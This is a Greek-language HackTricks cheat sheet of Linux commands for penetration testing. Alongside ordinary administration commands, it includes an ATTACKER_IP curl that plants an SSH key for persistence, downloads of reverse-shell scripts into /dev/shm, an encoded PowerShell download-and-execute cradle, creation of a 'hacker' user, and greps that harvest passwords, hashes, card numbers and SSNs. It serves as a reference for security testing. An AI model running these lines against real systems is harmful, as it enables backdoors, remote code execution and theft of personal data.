# Χρήσιμες Εντολές Linux

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Χρησιμοποιήστε το [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) για να δημιουργήσετε και να αυτοματοποιήσετε ροές εργασίας με τα πιο προηγμένα εργαλεία της κοινότητας.\
Αποκτήστε πρόσβαση σήμερα:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>Μάθετε το hacking στο AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι για να υποστηρίξετε το HackTricks:

* Εάν θέλετε να δείτε την εταιρεία σας να διαφημίζεται στο HackTricks ή να κατεβάσετε το HackTricks σε μορφή PDF, ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**The PEASS Family**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στη [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Μοιραστείτε τα κόλπα σας στο hacking υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.

</details>

## Κοινές εντολές Bash
```bash
#Exfiltration using Base64
base64 -w 0 file

#Get HexDump without new lines
xxd -p boot12.bin | tr -d '\n'

#Add public key to authorized keys
curl https://ATTACKER_IP/.ssh/id_rsa.pub >> ~/.ssh/authorized_keys

#Echo without new line and Hex
echo -n -e

#Count
wc -l <file> #Lines
wc -c #Chars

#Sort
sort -nr #Sort by number and then reverse
cat file | sort | uniq #Sort and delete duplicates

#Replace in file
sed -i 's/OLD/NEW/g' path/file #Replace string inside a file

#Download in RAM
wget 10.10.14.14:8000/tcp_pty_backconnect.py -O /dev/shm/.rev.py
wget 10.10.14.14:8000/tcp_pty_backconnect.py -P /dev/shm
curl 10.10.14.14:8000/shell.py -o /dev/shm/shell.py

#Files used by network processes
lsof #Open files belonging to any process
lsof -p 3 #Open files used by the process
lsof -i #Files used by networks processes
lsof -i 4 #Files used by network IPv4 processes
lsof -i 6 #Files used by network IPv6 processes
lsof -i 4 -a -p 1234 #List all open IPV4 network files in use by the process 1234
lsof +D /lib #Processes using files inside the indicated dir
lsof -i :80 #Files uses by networks processes
fuser -nv tcp 80

#Decompress
tar -xvzf /path/to/yourfile.tgz
tar -xvjf /path/to/yourfile.tbz
bzip2 -d /path/to/yourfile.bz2
tar jxf file.tar.bz2
gunzip /path/to/yourfile.gz
unzip file.zip
7z -x file.7z
sudo apt-get install xz-utils; unxz file.xz

#Add new user
useradd -p 'openssl passwd -1 <Password>' hacker

#Clipboard
xclip -sel c < cat file.txt

#HTTP servers
python -m SimpleHTTPServer 80
python3 -m http.server
ruby -rwebrick -e "WEBrick::HTTPServer.new(:Port => 80, :DocumentRoot => Dir.pwd).start"
php -S $ip:80

#Curl
#json data
curl --header "Content-Type: application/json" --request POST --data '{"password":"password", "username":"admin"}' http://host:3000/endpoint
#Auth via JWT
curl -X GET -H 'Authorization: Bearer <JWT>' http://host:3000/endpoint

#Send Email
sendEmail -t to@email.com -f from@email.com -s 192.168.8.131 -u Subject -a file.pdf #You will be prompted for the content

#DD copy hex bin file without first X (28) bytes
dd if=file.bin bs=28 skip=1 of=blob

#Mount .vhd files (virtual hard drive)
sudo apt-get install libguestfs-tools
guestmount --add NAME.vhd --inspector --ro /mnt/vhd #For read-only, create first /mnt/vhd

# ssh-keyscan, help to find if 2 ssh ports are from the same host comparing keys
ssh-keyscan 10.10.10.101

# Openssl
openssl s_client -connect 10.10.10.127:443 #Get the certificate from a server
openssl x509 -in ca.cert.pem -text #Read certificate
openssl genrsa -out newuser.key 2048 #Create new RSA2048 key
openssl req -new -key newuser.key -out newuser.csr #Generate certificate from a private key. Recommended to set the "Organizatoin Name"(Fortune) and the "Common Name" (newuser@fortune.htb)
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes #Create certificate
openssl x509 -req -in newuser.csr -CA intermediate.cert.pem -CAkey intermediate.key.pem -CAcreateserial -out newuser.pem -days 1024 -sha256 #Create a signed certificate
openssl pkcs12 -export -out newuser.pfx -inkey newuser.key -in newuser.pem #Create from the signed certificate the pkcs12 certificate format (firefox)
# If you only needs to create a client certificate from a Ca certificate and the CA key, you can do it using:
openssl pkcs12 -export -in ca.cert.pem -inkey ca.key.pem -out client.p12
# Decrypt ssh key
openssl rsa -in key.ssh.enc -out key.ssh
#Decrypt
openssl enc -aes256 -k <KEY> -d -in backup.tgz.enc -out b.tgz

#Count number of instructions executed by a program, need a host based linux (not working in VM)
perf stat -x, -e instructions:u "ls"

#Find trick for HTB, find files from 2018-12-12 to 2018-12-14
find / -newermt 2018-12-12 ! -newermt 2018-12-14 -type f -readable -not -path "/proc/*" -not -path "/sys/*" -ls 2>/dev/null

#Reconfigure timezone
sudo dpkg-reconfigure tzdata

#Search from which package is a binary
apt-file search /usr/bin/file #Needed: apt-get install apt-file

#Protobuf decode https://www.ezequiel.tech/2020/08/leaking-google-cloud-projects.html
echo "CIKUmMesGw==" | base64 -d | protoc --decode_raw

#Set not removable bit
sudo chattr +i file.txt
sudo chattr -i file.txt #Remove the bit so you can delete it

# List files inside zip
7z l file.zip
```
<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Χρησιμοποιήστε το [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) για να δημιουργήσετε και να αυτοματοποιήσετε εργασιακές διαδικασίες με τα πιο προηγμένα εργαλεία της κοινότητας.\
Αποκτήστε πρόσβαση σήμερα:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## Bash για Windows
```bash
#Base64 for Windows
echo -n "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.9:8000/9002.ps1')" | iconv --to-code UTF-16LE | base64 -w0

#Exe compression
upx -9 nc.exe

#Exe2bat
wine exe2bat.exe nc.exe nc.txt

#Compile Windows python exploit to exe
pip install pyinstaller
wget -O exploit.py http://www.exploit-db.com/download/31853
python pyinstaller.py --onefile exploit.py

#Compile for windows
#sudo apt-get install gcc-mingw-w64-i686
i686-mingw32msvc-gcc -o executable useradd.c
```
## Greps

Οι εντολές `grep` και `egrep` χρησιμοποιούνται για την αναζήτηση κειμένου σε αρχεία ή σε αποτελέσματα εντολών. Ακολουθούν μερικά παραδείγματα χρήσης:

- Αναζήτηση για ένα συγκεκριμένο κείμενο σε ένα αρχείο:
  ```
  grep "κείμενο" αρχείο
  ```

- Αναζήτηση για ένα συγκεκριμένο κείμενο σε πολλά αρχεία:
  ```
  grep "κείμενο" αρχείο1 αρχείο2 αρχείο3
  ```

- Αναζήτηση για ένα συγκεκριμένο κείμενο σε όλα τα αρχεία ενός φακέλου:
  ```
  grep "κείμενο" φάκελο/*
  ```

- Αναζήτηση για ένα συγκεκριμένο κείμενο, αγνοώντας την περίπτωση των γραμμάτων:
  ```
  grep -i "κείμενο" αρχείο
  ```

- Αναζήτηση για ένα συγκεκριμένο κείμενο, εμφανίζοντας τις γραμμές που το περιέχουν:
  ```
  grep -n "κείμενο" αρχείο
  ```

- Αναζήτηση για ένα συγκεκριμένο κείμενο, εμφανίζοντας μόνο τις γραμμές που δεν το περιέχουν:
  ```
  grep -v "κείμενο" αρχείο
  ```

- Αναζήτηση για ένα συγκεκριμένο κείμενο, εμφανίζοντας τις γραμμές που το περιέχουν και τις γραμμές που το περιβάλλουν:
  ```
  grep -A 2 -B 2 "κείμενο" αρχείο
  ```

- Αναζήτηση για ένα συγκεκριμένο κείμενο, εμφανίζοντας μόνο τις γραμμές που το περιέχουν και τον αριθμό της γραμμής:
  ```
  grep -n "κείμενο" αρχείο | cut -d ":" -f 1
  ```

- Αναζήτηση για ένα συγκεκριμένο κείμενο, εμφανίζοντας μόνο τον αριθμό των γραμμών που το περιέχουν:
  ```
  grep -c "κείμενο" αρχείο
  ```

Οι εντολές `grep` και `egrep` είναι ιδιαίτερα χρήσιμες για την αναζήτηση κειμένου σε αρχεία και την εξαγωγή σχετικών πληροφοριών.
```bash
#Extract emails from file
grep -E -o "\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,6}\b" file.txt

#Extract valid IP addresses
grep -E -o "(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)" file.txt

#Extract passwords
grep -i "pwd\|passw" file.txt

#Extract users
grep -i "user\|invalid\|authentication\|login" file.txt

# Extract hashes
#Extract md5 hashes ({32}), sha1 ({40}), sha256({64}), sha512({128})
egrep -oE '(^|[^a-fA-F0-9])[a-fA-F0-9]{32}([^a-fA-F0-9]|$)' *.txt | egrep -o '[a-fA-F0-9]{32}' > md5-hashes.txt
#Extract valid MySQL-Old hashes
grep -e "[0-7][0-9a-f]{7}[0-7][0-9a-f]{7}" *.txt > mysql-old-hashes.txt
#Extract blowfish hashes
grep -e "$2a\$\08\$(.){75}" *.txt > blowfish-hashes.txt
#Extract Joomla hashes
egrep -o "([0-9a-zA-Z]{32}):(w{16,32})" *.txt > joomla.txt
#Extract VBulletin hashes
egrep -o "([0-9a-zA-Z]{32}):(S{3,32})" *.txt > vbulletin.txt
#Extraxt phpBB3-MD5
egrep -o '$H$S{31}' *.txt > phpBB3-md5.txt
#Extract Wordpress-MD5
egrep -o '$P$S{31}' *.txt > wordpress-md5.txt
#Extract Drupal 7
egrep -o '$S$S{52}' *.txt > drupal-7.txt
#Extract old Unix-md5
egrep -o '$1$w{8}S{22}' *.txt > md5-unix-old.txt
#Extract md5-apr1
egrep -o '$apr1$w{8}S{22}' *.txt > md5-apr1.txt
#Extract sha512crypt, SHA512(Unix)
egrep -o '$6$w{8}S{86}' *.txt > sha512crypt.txt

#Extract e-mails from text files
grep -E -o "\b[a-zA-Z0-9.#?$*_-]+@[a-zA-Z0-9.#?$*_-]+.[a-zA-Z0-9.-]+\b" *.txt > e-mails.txt

#Extract HTTP URLs from text files
grep http | grep -shoP 'http.*?[" >]' *.txt > http-urls.txt
#For extracting HTTPS, FTP and other URL format use
grep -E '(((https|ftp|gopher)|mailto)[.:][^ >"	]*|www.[-a-z0-9.]+)[^ .,;	>">):]' *.txt > urls.txt
#Note: if grep returns "Binary file (standard input) matches" use the following approaches # tr '[\000-\011\013-\037177-377]' '.' < *.log | grep -E "Your_Regex" OR # cat -v *.log | egrep -o "Your_Regex"

#Extract Floating point numbers
grep -E -o "^[-+]?[0-9]*.?[0-9]+([eE][-+]?[0-9]+)?$" *.txt > floats.txt

# Extract credit card data
#Visa
grep -E -o "4[0-9]{3}[ -]?[0-9]{4}[ -]?[0-9]{4}[ -]?[0-9]{4}" *.txt > visa.txt
#MasterCard
grep -E -o "5[0-9]{3}[ -]?[0-9]{4}[ -]?[0-9]{4}[ -]?[0-9]{4}" *.txt > mastercard.txt
#American Express
grep -E -o "\b3[47][0-9]{13}\b" *.txt > american-express.txt
#Diners Club
grep -E -o "\b3(?:0[0-5]|[68][0-9])[0-9]{11}\b" *.txt > diners.txt
#Discover
grep -E -o "6011[ -]?[0-9]{4}[ -]?[0-9]{4}[ -]?[0-9]{4}" *.txt > discover.txt
#JCB
grep -E -o "\b(?:2131|1800|35d{3})d{11}\b" *.txt > jcb.txt
#AMEX
grep -E -o "3[47][0-9]{2}[ -]?[0-9]{6}[ -]?[0-9]{5}" *.txt > amex.txt

# Extract IDs
#Extract Social Security Number (SSN)
grep -E -o "[0-9]{3}[ -]?[0-9]{2}[ -]?[0-9]{4}" *.txt > ssn.txt
#Extract Indiana Driver License Number
grep -E -o "[0-9]{4}[ -]?[0-9]{2}[ -]?[0-9]{4}" *.txt > indiana-dln.txt
#Extract US Passport Cards
grep -E -o "C0[0-9]{7}" *.txt > us-pass-card.txt
#Extract US Passport Number
grep -E -o "[23][0-9]{8}" *.txt > us-pass-num.txt
#Extract US Phone Numberss
grep -Po 'd{3}[s-_]?d{3}[s-_]?d{4}' *.txt > us-phones.txt
#Extract ISBN Numbers
egrep -a -o "\bISBN(?:-1[03])?:? (?=[0-9X]{10}$|(?=(?:[0-9]+[- ]){3})[- 0-9X]{13}$|97[89][0-9]{10}$|(?=(?:[0-9]+[- ]){4})[- 0-9]{17}$)(?:97[89][- ]?)?[0-9]{1,5}[- ]?[0-9]+[- ]?[0-9]+[- ]?[0-9X]\b" *.txt > isbn.txt
```
## Εύρεση

The `find` command is used to search for files and directories in a directory hierarchy based on various criteria. It is a powerful tool that can be used to locate specific files or perform complex searches.

### Basic Usage

The basic syntax of the `find` command is as follows:

```
find [path] [expression]
```

- `[path]`: Specifies the directory or directories to search in. If no path is provided, the current directory is used.
- `[expression]`: Specifies the search criteria. This can include file names, file types, file sizes, and more.

### Examples

Here are some examples of how the `find` command can be used:

- Search for a file named `example.txt` in the current directory and its subdirectories:

  ```
  find . -name example.txt
  ```

- Search for all files with the `.txt` extension in the `/home/user` directory:

  ```
  find /home/user -name "*.txt"
  ```

- Search for files larger than 1MB in the `/var/log` directory:

  ```
  find /var/log -size +1M
  ```

- Search for directories with the word `backup` in their name:

  ```
  find / -type d -name "*backup*"
  ```

### Conclusion

The `find` command is a versatile tool for searching files and directories in Linux. By using different expressions, you can customize your search and find exactly what you're looking for.
```bash
# Find SUID set files.
find / -perm /u=s -ls 2>/dev/null

# Find SGID set files.
find / -perm /g=s -ls 2>/dev/null

# Found Readable directory and sort by time.  (depth = 4)
find / -type d -maxdepth 4 -readable -printf "%T@ %Tc | %p \n" 2>/dev/null | grep -v "| /proc" | grep -v "| /dev" | grep -v "| /run" | grep -v "| /var/log" | grep -v "| /boot"  | grep -v "| /sys/" | sort -n -r

# Found Writable directory and sort by time.  (depth = 10)
find / -type d -maxdepth 10 -writable -printf "%T@ %Tc | %p \n" 2>/dev/null | grep -v "| /proc" | grep -v "| /dev" | grep -v "| /run" | grep -v "| /var/log" | grep -v "| /boot"  | grep -v "| /sys/" | sort -n -r

# Or Found Own by Current User and sort by time. (depth = 10)
find / -maxdepth 10 -user $(id -u) -printf "%T@ %Tc | %p \n" 2>/dev/null | grep -v "| /proc" | grep -v "| /dev" | grep -v "| /run" | grep -v "| /var/log" | grep -v "| /boot"  | grep -v "| /sys/" | sort -n -r

# Or Found Own by Current Group ID and Sort by time. (depth = 10)
find / -maxdepth 10 -group $(id -g) -printf "%T@ %Tc | %p \n" 2>/dev/null | grep -v "| /proc" | grep -v "| /dev" | grep -v "| /run" | grep -v "| /var/log" | grep -v "| /boot"  | grep -v "| /sys/" | sort -n -r

# Found Newer files and sort by time. (depth = 5)
find / -maxdepth 5 -printf "%T@ %Tc | %p \n" 2>/dev/null | grep -v "| /proc" | grep -v "| /dev" | grep -v "| /run" | grep -v "| /var/log" | grep -v "| /boot"  | grep -v "| /sys/" | sort -n -r | less

# Found Newer files only and sort by time. (depth = 5)
find / -maxdepth 5 -type f -printf "%T@ %Tc | %p \n" 2>/dev/null | grep -v "| /proc" | grep -v "| /dev" | grep -v "| /run" | grep -v "| /var/log" | grep -v "| /boot"  | grep -v "| /sys/" | sort -n -r | less

# Found Newer directory only and sort by time. (depth = 5)
find / -maxdepth 5 -type d -printf "%T@ %Tc | %p \n" 2>/dev/null | grep -v "| /proc" | grep -v "| /dev" | grep -v "| /run" | grep -v "| /var/log" | grep -v "| /boot"  | grep -v "| /sys/" | sort -n -r | less
```
## Βοήθεια για αναζήτηση με το Nmap

Nmap είναι ένα εργαλείο ανοικτού κώδικα για ανίχνευση δικτύου και ανάλυση ασφαλείας. Παρέχει πολλές επιλογές αναζήτησης για να σας βοηθήσει να εξερευνήσετε ένα δίκτυο και να εντοπίσετε ευπάθειες ασφαλείας. Παρακάτω παρέχονται μερικές χρήσιμες εντολές αναζήτησης που μπορείτε να χρησιμοποιήσετε με το Nmap:

- `nmap -sn <IP>`: Ανιχνεύει τις συσκευές στο δίκτυο χωρίς να σαρώνει τις πόρτες.
- `nmap -p- <IP>`: Σαρώνει όλες τις πόρτες σε ένα συγκεκριμένο IP.
- `nmap -sV <IP>`: Ανιχνεύει τις υπηρεσίες που εκτελούνται σε ένα συγκεκριμένο IP.
- `nmap -A <IP>`: Εκτελεί μια πλήρη ανάλυση ασφαλείας, συμπεριλαμβανομένης της ανίχνευσης λειτουργικού συστήματος, των υπηρεσιών και των ευπαθειών.
- `nmap --script <script> <IP>`: Εκτελεί ένα συγκεκριμένο script Nmap σε ένα συγκεκριμένο IP.

Αυτές είναι μόνο μερικές από τις εντολές αναζήτησης που μπορείτε να χρησιμοποιήσετε με το Nmap. Εξερευνήστε την τεκμηρίωση του Nmap για περισσότερες πληροφορίες και επιλογές.
```bash
#Nmap scripts ((default or version) and smb))
nmap --script-help "(default or version) and *smb*"
locate -r '\.nse$' | xargs grep categories | grep 'default\|version\|safe' | grep smb
nmap --script-help "(default or version) and smb)"
```
## Εντολές Bash

Οι εντολές Bash είναι εντολές που μπορούν να εκτελεστούν στο κέλυφος του Bash (Bourne Again SHell). Αυτές οι εντολές παρέχουν διάφορες λειτουργίες και δυνατότητες για τη διαχείριση του συστήματος Linux. Παρακάτω παρουσιάζονται μερικές χρήσιμες εντολές Bash:

- `ls`: Εμφανίζει τα αρχεία και τους φακέλους στον τρέχοντα κατάλογο.
- `cd`: Αλλάζει τον τρέχοντα κατάλογο.
- `pwd`: Εμφανίζει τον απόλυτο δρόμο του τρέχοντος καταλόγου.
- `mkdir`: Δημιουργεί έναν νέο φάκελο.
- `rm`: Διαγράφει ένα αρχείο ή έναν φάκελο.
- `cp`: Αντιγράφει ένα αρχείο ή έναν φάκελο.
- `mv`: Μετακινεί ένα αρχείο ή έναν φάκελο.
- `cat`: Εμφανίζει το περιεχόμενο ενός αρχείου.
- `grep`: Αναζητά για ένα συγκεκριμένο κείμενο σε ένα αρχείο ή σε πολλά αρχεία.
- `chmod`: Αλλάζει τα δικαιώματα πρόσβασης ενός αρχείου ή ενός φακέλου.
- `chown`: Αλλάζει τον ιδιοκτήτη ενός αρχείου ή ενός φακέλου.
- `ps`: Εμφανίζει τις ενεργές διεργασίες.
- `top`: Εμφανίζει τις ενεργές διεργασίες και τη χρήση των πόρων του συστήματος.
- `kill`: Τερματίζει μια ενεργή διεργασία.
- `ssh`: Συνδέεται σε έναν απομακρυσμένο υπολογιστή μέσω πρωτοκόλλου SSH.
- `wget`: Κατεβάζει ένα αρχείο από το διαδίκτυο.
- `curl`: Κάνει αιτήσεις HTTP σε έναν διακομιστή.

Αυτές είναι μόνο μερικές από τις πολλές εντολές Bash που είναι διαθέσιμες. Μπορείτε να εξερευνήσετε περισσότερες εντολές και να ανακαλύψετε τις δυνατότητες του Bash κέλυφους για την αποτελεσματική διαχείριση του συστήματος Linux.
```bash
#All bytes inside a file (except 0x20 and 0x00)
for j in $((for i in {0..9}{0..9} {0..9}{a..f} {a..f}{0..9} {a..f}{a..f}; do echo $i; done ) | sort | grep -v "20\|00"); do echo -n -e "\x$j" >> bytes; done
```
## Iptables

Το Iptables είναι ένα εργαλείο που χρησιμοποιείται για την διαχείριση των κανόνων του firewall σε συστήματα Linux. Με το Iptables μπορείτε να δημιουργήσετε, να τροποποιήσετε και να διαγράψετε κανόνες που ελέγχουν την κίνηση των δεδομένων στο δίκτυο.

Οι βασικές εντολές που χρησιμοποιούνται με το Iptables είναι οι εξής:

- `iptables -L`: Εμφανίζει τους κανόνες του firewall.
- `iptables -A`: Προσθέτει έναν νέο κανόνα στο firewall.
- `iptables -D`: Διαγράφει έναν κανόνα από το firewall.
- `iptables -P`: Ορίζει την προεπιλεγμένη ενέργεια για έναν κανόνα.

Μπορείτε επίσης να χρησιμοποιήσετε διάφορες επιλογές με αυτές τις εντολές για να προσαρμόσετε τη συμπεριφορά του firewall σύμφωνα με τις ανάγκες σας.
```bash
#Delete curent rules and chains
iptables --flush
iptables --delete-chain

#allow loopback
iptables -A INPUT -i lo -j ACCEPT
iptables -A OUTPUT -o lo -j ACCEPT

#drop ICMP
iptables -A INPUT -p icmp -m icmp --icmp-type any -j DROP
iptables -A OUTPUT -p icmp -j DROP

#allow established connections
iptables -A INPUT -m state --state RELATED,ESTABLISHED -j ACCEPT

#allow ssh, http, https, dns
iptables -A INPUT -s 10.10.10.10/24 -p tcp -m tcp --dport 22 -j ACCEPT
iptables -A INPUT -p tcp -m state --state NEW -m tcp --dport 80 -j ACCEPT
iptables -A INPUT -p tcp -m state --state NEW -m tcp --dport 443 -j ACCEPT
iptables -A INPUT -p udp -m udp --sport 53 -j ACCEPT
iptables -A INPUT -p tcp -m tcp --sport 53 -j ACCEPT
iptables -A OUTPUT -p udp -m udp --dport 53 -j ACCEPT
iptables -A OUTPUT -p tcp -m tcp --dport 53 -j ACCEPT

#default policies
iptables -P INPUT DROP
iptables -P FORWARD ACCEPT
iptables -P OUTPUT ACCEPT
```
<details>

<summary><strong>Μάθετε το hacking του AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι για να υποστηρίξετε το HackTricks:

* Εάν θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**την Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στη [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Μοιραστείτε τα hacking tricks σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.

</details>

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Χρησιμοποιήστε το [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) για να δημιουργήσετε και να **αυτοματοποιήσετε ροές εργασίας** με τα πιο προηγμένα εργαλεία της κοινότητας.\
Αποκτήστε πρόσβαση σήμερα:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
